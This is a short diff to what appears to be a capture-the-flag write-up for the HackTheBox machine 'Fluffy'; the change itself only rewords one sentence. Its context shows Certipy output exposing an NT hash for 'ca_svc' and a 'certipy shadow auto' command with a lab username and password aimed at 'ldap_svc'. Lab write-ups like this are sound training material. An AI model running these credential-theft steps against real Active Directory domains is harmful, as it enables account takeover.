@@ -564,7 +564,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
 ```
 
-Got the `NT hash` for `ca_svc` so typically, we can grab `NT hash` for `ldap_svc` and even `winrm_svc` also.
+Got the `NT hash` for `ca_svc` so typically, we can grab `NT hash` for `ldap_svc` and even `winrm_svc`.
 
 ```bash
 └─$ certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'ldap_svc'                                                                                   
